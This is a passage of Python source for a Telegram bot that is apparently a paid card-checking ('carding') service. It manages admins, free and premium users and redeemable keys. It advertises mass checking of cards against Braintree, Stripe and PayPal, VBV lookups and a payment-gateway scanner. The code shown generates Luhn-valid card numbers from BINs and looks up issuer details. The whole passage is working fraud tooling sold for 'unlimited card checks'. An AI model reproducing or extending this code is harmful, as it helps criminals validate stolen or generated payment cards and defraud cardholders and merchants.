• Contact the main admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/removeadmin <user_id>`
• Example: `/removeadmin 12734567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id == MAIN_ADMIN_ID:
            return send_long_message(msg.chat.id, """
❌ *Cannot Remove Main Admin* ❌
 
• You cannot remove the main admin""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        if user_id not in admins:
            return send_long_message(msg.chat.id, """
❌ *Not An Admin* ❌

• This user is not an admin""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        admins.remove(user_id)
        if save_admins(admins):
            send_long_message(msg.chat.id, f"""
✅ *Admin Removed* ✅

• Successfully removed `{user_id}` from admins
• Total admins: {len(admins)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Failed to save admin changes to database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid User ID* ❌

• Please provide a valid numeric user ID
• Usage: `/removeadmin 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['unauth'])
def unauth_user(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can unauthorize users
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    conn = None
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/unauth <user_id>`
• Example: `/unauth 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = int(parts[1])
        
        # Remove user from free_users table
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Cannot connect to database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
            
        cursor = conn.cursor()
        cursor.execute("DELETE FROM free_users WHERE user_id = %s", (user_id,))
        conn.commit()
        
        if cursor.rowcount > 0:
            # Clear cache
            cache_key = f"free_user_{user_id}"
            if cache_key in user_cache:
                del user_cache[cache_key]
                
            send_long_message(msg.chat.id, f"""
✅ *User Unauthorized* ✅

• Successfully removed authorization for user: `{user_id}`
• User can no longer use the bot in private chats""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, f"""
❌ *User Not Found* ❌

• User `{user_id}` was not found in the authorized users list
• No action taken""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid User ID* ❌

• Please provide a valid numeric user ID
• Usage: `/unauth 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listfree'])
def list_free_users(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can view the free users list
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Cannot connect to database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
            
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, first_name FROM free_users ORDER BY user_id")
        free_users = cursor.fetchall()
        
        if not free_users:
            return send_long_message(msg.chat.id, """
📋 *No Free Users* 📋

• There are no authorized free users""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_list = ""
        for user_id, first_name in free_users:
            user_list += f"• `{user_id}` - {first_name}\n"
        
        send_long_message(msg.chat.id, f"""
📋 *Free Users List* 📋

{user_list}
• *Total free users*: {len(free_users)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listadmins'])
def list_admins(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can view the admin list
• Contact an admin to get access""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    admins = load_admins()
    if not admins:
        return send_long_message(msg.chat.id, """
❌ *No Admins* ❌

• There are no admins configured""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    admin_list = ""
    for i, admin_id in enumerate(admins, 1):
        if admin_id == MAIN_ADMIN_ID:
            admin_list += f"• `{admin_id}` (Main Admin) 👑\n"
        else:
            admin_list += f"• `{admin_id}`\n"
    
    send_long_message(msg.chat.id, f"""
📋 *Admin List* 📋

{admin_list}
• *Total admins*: {len(admins)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['authgroup'])
def authorize_group(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only the main admin can authorize groups""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/authgroup <group_id>`
• Example: `/authgroup -1001234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        group_id = int(parts[1])

        if add_authorized_group(group_id):
            groups = load_authorized_groups()
            send_long_message(msg.chat.id, f"""
✅ *Group Authorized* ✅

• Successfully authorized group: `{group_id}`
• Total authorized groups: {len(groups)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Failed to authorize group
• Please try again later""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid Group ID* ❌

• Please provide a valid numeric group ID""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['unauthgroup'])
def unauthorize_group(msg):
    """Remove group authorization"""
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only the main admin can unauthorize groups""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/unauthgroup <group_id>`
• Example: `/unauthgroup -1001234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        group_id = int(parts[1])

        if remove_authorized_group(group_id):
            groups = load_authorized_groups()
            send_long_message(msg.chat.id, f"""
✅ *Group Unauthorized* ✅

• Successfully removed authorization for group: `{group_id}`
• Total authorized groups: {len(groups)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
❌ *Group Not Found* ❌

• The specified group was not found in authorized groups
• No action taken""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid Group ID* ❌

• Please provide a valid numeric group ID""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['listgroups'])
def list_authorized_groups(msg):
    """List all authorized groups"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can view authorized groups""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    groups = load_authorized_groups()
    
    if not groups:
        return send_long_message(msg.chat.id, """
📋 *No Authorized Groups* 📋

• There are no authorized groups""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    group_list = ""
    for i, group_id in enumerate(groups, 1):
        group_list += f"• `{group_id}`\n"
    
    send_long_message(msg.chat.id, f"""
📋 *Authorized Groups* 📋

{group_list}
• *Total groups*: {len(groups)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- New Key Management Commands ---------------- #

@bot.message_handler(commands=['revokekey'])
def revoke_key_command(msg):
    """Revoke a premium key"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can revoke keys
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/revokekey <key>`
• Example: `/revokekey ABC123DEF456GHI78`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        key = parts[1]
        
        if revoke_key(key):
            send_long_message(msg.chat.id, f"""
✅ *Key Revoked* ✅

• Successfully revoked key: `{key}`
• This key can no longer be used for redemption""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
❌ *Key Not Found* ❌

• The specified key was not found
• Please check the key and try again""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['deletekey'])
def delete_key_command(msg):
    """Delete a premium key"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can delete keys
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/deletekey <key>`
• Example: `/deletekey ABC123DEF456GHI78`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        key = parts[1]
        
        if delete_key(key):
            send_long_message(msg.chat.id, f"""
✅ *Key Deleted* ✅

• Successfully deleted key: `{key}`
• This key has been permanently removed""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
❌ *Key Not Found* ❌

• The specified key was not found
• Please check the key and try again""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['listkeys'])
def list_keys_command(msg):
    """List all premium keys"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can view keys
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        keys = get_all_keys()
        
        if not keys:
            return send_long_message(msg.chat.id, """
📋 *No Keys Found* 📋

• There are no premium keys in the database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        key_list = ""
        for key_data in keys:
            status = "🟢 Active" if not key_data.get('used_by') and not key_data.get('revoked') else "🔴 Used" if key_data.get('used_by') else "🚫 Revoked"
            used_by = f" (Used by: {key_data['used_by']})" if key_data.get('used_by') else ""
            revoked = " (REVOKED)" if key_data.get('revoked') else ""
            key_list += f"• `{key_data['key']}` - {key_data['validity_days']} days {status}{used_by}{revoked}\n"
        
        send_long_message(msg.chat.id, f"""
🔑 *Premium Keys List* 🔑

{key_list}
• *Total keys*: {len(keys)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['rprem'])
def remove_premium_command(msg):
    """Remove premium subscription from a user"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can remove premium subscriptions
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/rprem <user_id>`
• Example: `/rprem 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = int(parts[1])
        
        if remove_premium(user_id):
            send_long_message(msg.chat.id, f"""
✅ *Premium Removed* ✅

• Successfully removed premium subscription from user: `{user_id}`
• User has been downgraded to free user""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, f"""
❌ *User Not Found* ❌

• User `{user_id}` was not found in premium users list
• No action taken""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid User ID* ❌

• Please provide a valid numeric user ID
• Usage: `/rprem 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- Subscription Commands ---------------- #

@bot.message_handler(commands=['subscription'])
def subscription_info(msg):
    """Show subscription plans"""
    user_id = msg.from_user.id
    
    if is_admin(user_id):
        send_long_message(msg.chat.id, f"""
💎 *Subscription Info* 💎

• You are the Premium Owner of this bot 👑
• *Expiry*: Unlimited ♾️
• Enjoy unlimited card checks 🛒

💰 *Premium Features* 💰
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅

📋 *Premium Plans*
• 7 days - $5 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    elif is_premium(user_id):
        remaining, expiry_date = get_subscription_info(user_id)
        
        send_long_message(msg.chat.id, f"""
💎 *Subscription Info* 💎

• You have a Premium subscription 💰
• *Remaining*: {remaining}
• *Expiry*: {expiry_date}
• Enjoy unlimited card checks 🛒

💰 *Premium Features* 💰
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

📋 *Premium Plans*
• 7 days - $5 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        send_long_message(msg.chat.id, """
🔓 *Free Account* 🔓

• You are using a Free account 🔓
• *Limit*: 15 cards per check 📊

💰 *Premium Features* 💰
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

💰 *Premium Plans* 💰
• 7 days - $5 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def generate_key(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, "❌ You are not authorized to generate keys.", reply_to_message_id=msg.message_id)

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, "❌ Usage: /genkey <validity_days>", reply_to_message_id=msg.message_id)
            
        validity = int(parts[1])
        import random, string
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

        if store_key(key, validity):
            send_long_message(msg.chat.id, f"🔑 *Generated Key*\n\n`{key}`\n\n✅ Valid for {validity} days", parse_mode='Markdown', reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, "❌ Error storing key in database", reply_to_message_id=msg.message_id)
    except ValueError:
        send_long_message(msg.chat.id, "❌ Please provide a valid number of days", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"❌ Error generating key: {str(e)}", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['redeem'])
def redeem_key(msg):
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, "❌ Usage: /redeem <KEY>", reply_to_message_id=msg.message_id)
            
        user_key = parts[1]
        key_data = is_key_valid(user_key)
        if not key_data:
            return send_long_message(msg.chat.id, "❌ Invalid or already used key.", reply_to_message_id=msg.message_id)

        if mark_key_as_used(user_key, msg.from_user.id) and add_premium(msg.from_user.id, msg.from_user.first_name, key_data['validity_days']):
            # Send notification to admin
            user_info = get_user_info(msg.from_user.id)
            subscription_info = get_subscription_info(msg.from_user.id)
            
            notification = f"""
🎟️ *Premium Redeemed* 🎟️

👤 *User*: {user_info['full_name']}
🆔 *ID*: `{msg.from_user.id}`
📱 *Username*: {user_info['username']}
🎫 *Type*: {user_info['user_type']}

🗓️ *Validity*: {key_data['validity_days']} days
🔑 *Key*: `{user_key}`
📅 *Expiry*: {subscription_info[1]}

⏰ *Time*: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

⚡ *Powered by @mhitzxg*
"""

            notify_admin(notification)
            send_long_message(msg.chat.id, f"✅ Key redeemed successfully!\n🎟️ Subscription valid for {key_data['validity_days']} days.", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, "❌ Error redeeming key. Please try again.", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"❌ Error redeeming key: {str(e)}", reply_to_message_id=msg.message_id)

# ---------------- Register Command ---------------- #

@bot.message_handler(commands=['register'])
def register_user(msg):
    """Register a new user"""
    user_id = msg.from_user.id
    first_name = msg.from_user.first_name or "User"
    
    # Check if user is already registered
    if is_authorized(msg):
        send_long_message(msg.chat.id, """
✅ *Already Registered* ✅

• You are already registered!
• You can now use the bot commands""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        return
        
    # Add user to free_users table
    if add_free_user(user_id, first_name):
        send_long_message(msg.chat.id, f"""
✅ *Registration Success* ✅

• Welcome {first_name}! You are now registered.
• You can now use the bot commands

📋 *Available Commands*
• /br - Check single card (Braintree)
• /mbr - Mass check cards (Braintree)
• /ch - Check single card (Stripe)
• /mch - Mass check cards (Stripe)
• /pp - Check single card (PayPal)
• /mpp - Mass check cards (PayPal)
• /st -  Non-sk single card (Stripe)
• /mst - Non-sk mass card (Stripe)
• /sk -  sk-based single card (Stripe)
• /msk - sk-based mass cards (Stripe) 
• /vbv - VBV Loopkup (Braintree)
• /mvbv - Mass VBV Lookup (Braintree)
• /url - Gateway Scanner (Scan URLs for payment gateways)
• /gen - Generate cards
• /info - Your account info
• /subscription - Premium plans

• Enjoy your free account! 🔓""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        send_long_message(msg.chat.id, """
⚠️ *Registration Error* ⚠️

• Error: Database connection failed
• Please try again or contact admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- Info Command ---------------- #

@bot.message_handler(commands=['info'])
def user_info(msg):
    """Show user information"""
    user_id = msg.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    info_message = f"""
👤 *User Information* 👤

👤 *Name*: {user_data['full_name']}
🆔 *User ID*: `{user_data['user_id']}`
📱 *Username*: {user_data['username']}
🎫 *Account Type*: {user_data['user_type']}

💰 *Subscription*: {remaining}
📅 *Expiry Date*: {expiry_date}
⏰ *Current Time*: {current_time}

🌐 *Status* 🌐

🔌 *Proxy*: {check_proxy_status()}
🔓 *Authorized*: {'Yes ✅' if is_authorized(msg) else 'No ❌'}

⚡ *Powered by @mhitzxg*
"""
    
    send_long_message(msg.chat.id, info_message, parse_mode='Markdown', reply_to_message_id=msg.message_id)

# ---------------- Gen Command ---------------- #

@bot.message_handler(commands=['gen'])
def gen_handler(msg):
    """Generate cards using Luhn algorithm"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can generate cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check if user provided a pattern
    args = msg.text.split(None, 1)
    if len(args) < 2:
        return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card pattern to generate
• Usage: `/gen <pattern>`

*Valid formats*
`/gen 483318` - Just BIN (6+ digits)
`/gen 483318|12|25|123` - BIN with MM/YY/CVV
`/gen 472927xx` - Pattern with x's

• Use 'x' for random digits
• BIN must be at least 6 digits
• Example: `/gen 483318` or `/gen 483318|12|25|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    pattern = args[1]
    
    # Show processing message
    processing = send_long_message(msg.chat.id, """
♻️ *Generating Cards* ♻️

• Your cards are being generated...
• Please wait a moment

✗ Using Luhn algorithm for valid cards""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def generate_and_reply():
        try:
            import time
            start_time = time.time()
            
            # Generate 10 cards using the pattern
            cards, bin_info, error = card_generator.generate_cards(pattern, 10)
            
            if error:
                edit_long_message(msg.chat.id, processing.message_id, f"""
❌ *Generation Failed* ❌

{error}

✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
                return
            
            if not cards:
                edit_long_message(msg.chat.id, processing.message_id, """
❌ *No Cards Generated* ❌

• Failed to generate cards
• Please check your pattern and try again

✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
                return
            
            # Extract BIN from first card
            first_card = cards[0]
            bin_code = first_card.split('|')[0][:6]
            
            # Format cards with code blocks for easy copying
            formatted_cards = []
            for card in cards:
                formatted_cards.append(f"`{card}`")
            
            elapsed_time = time.time() - start_time
            
            # Get BIN info
            if bin_info:
                brand = bin_info.get('brand', 'UNKNOWN')
                card_type = bin_info.get('type', 'UNKNOWN')
                level = bin_info.get('level', 'UNKNOWN')
                bank = bin_info.get('bank', '🏛')
                country = bin_info.get('country', 'Unknown')
                emoji = bin_info.get('emoji', '')
                info_line = f"{brand} - {card_type} - {level}"
            else:
                info_line = "UNKNOWN - UNKNOWN - UNKNOWN"
                bank = "🏛"
                country = "Unknown"
                emoji = ""
            
            # Get user info
            user_info_data = get_user_info(msg.from_user.id)
            user_type = user_info_data.get('user_type', 'FREE')
            
            # Create the final message matching the requested format
            final_message = f"""
- 𝐂𝐂 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲
- 𝐁𝐢𝐧 - {bin_code}
- 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(cards)}

{chr(10).join(formatted_cards)}

- 𝗜𝗻𝗳𝗼 - {info_line}
- 𝐁𝐚𝐧𝐤 - {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {emoji}

- 𝐓𝐢𝐦𝐞: - {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 -  {user_type.upper()} [ FREE ]
"""
            
            # Send the generated cards
            edit_long_message(msg.chat.id, processing.message_id, final_message, parse_mode='Markdown')
            
        except Exception as e:
            error_msg = f"""
❌ *Generation Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
            edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')

    threading.Thread(target=generate_and_reply).start()

@bot.message_handler(commands=['gentxt'])
def gentxt_handler(msg):
    """Generate cards and send as text file"""
    try:
        print(f"Received gentxt command from {msg.from_user.id}: {msg.text}")
        
        if not is_authorized(msg):
            return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can generate cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Check if user provided a pattern
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card pattern to generate
• Usage: `/gentxt <pattern>`

*Valid formats*
`/gentxt 483318` - Just BIN (6+ digits)
`/gentxt 483318|12|25|123` - BIN with MM/YY/CVV
`/gentxt 472927xx` - Pattern with x's

• Use 'x' for random digits
• BIN must be at least 6 digits
• Example: `/gentxt 483318` or `/gentxt 483318|12|25|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        pattern = args[1]
        print(f"Pattern to generate: {pattern}")
        
        # Show processing message
        processing = send_long_message(msg.chat.id, """
♻️ *Generating Cards* ♻️

• Your cards are being generated...
• Please wait a moment

✗ Creating text file with valid cards""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        if isinstance(processing, list) and len(processing) > 0:
            processing = processing[0]

        def generate_and_send_file():
            try:
                print(f"Starting card generation for pattern: {pattern}")
                
                # Generate cards (50 cards for text file)
                cards, bin_info, error = card_generator.generate_cards(pattern, 50)
                
                if error:
                    print(f"Card generation error: {error}")
                    edit_long_message(msg.chat.id, processing.message_id, f"""
❌ *Generation Failed* ❌

{error}

✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
                    return
                
                print(f"Successfully generated {len(cards)} cards")
                
                # Extract BIN from pattern for filename
                bin_match = re.search(r'(\d{6})', pattern.replace('|', '').replace('x', '').replace('X', ''))
                bin_code = bin_match.group(1) if bin_match else "cards"
                
                # Create text file content - ONLY CARDS, NOTHING ELSE
                file_content = "\n".join(cards)
                
                # Send as text file
                try:
                    # Delete processing message first
                    bot.delete_message(msg.chat.id, processing.message_id)
                    print("Deleted processing message")
                except Exception as e:
                    print(f"Could not delete processing message: {e}")
                
                # Send the file
                import io
                file_buffer = io.BytesIO(file_content.encode('utf-8'))
                file_buffer.name = f'{bin_code}_cards.txt'
                
                print(f"Sending file with {len(cards)} cards")
                bot.send_document(
                    msg.chat.id,
                    file_buffer,
                    caption=f"✅ Generated {len(cards)} cards with BIN: {bin_code}",
                    reply_to_message_id=msg.message_id
                )
                print("File sent successfully")
                
            except Exception as e:
                print(f"Error in generate_and_send_file: {e}")
                error_msg = f"""
❌ *Generation Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
                try:
                    edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')
                except:
                    send_long_message(msg.chat.id, error_msg, reply_to_message_id=msg.message_id, parse_mode='Markdown')

        threading.Thread(target=generate_and_send_file).start()
        print("Started generation thread")
        
    except Exception as e:
        print(f"Error in gentxt_handler: {e}")
        send_long_message(msg.chat.id, f"""
❌ *Command Error* ❌

*Error*: {str(e)}

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- BIN Lookup Function ---------------- #
def get_bin_info_for_bot(bin_number):
    """Get BIN information for /bin command"""
    if not bin_number or len(bin_number) < 6:
        return None
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=5, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bin': bin_code,
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'country_code': data.get('country', {}).get('alpha2', ''),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bin': bin_code,
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'country_code': data.get('country_code', ''),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return None

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

# ---------------- New Tool Commands ---------------- #

@bot.message_handler(commands=['bin'])
def bin_handler(msg):
    """BIN Lookup command"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can lookup BINs

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
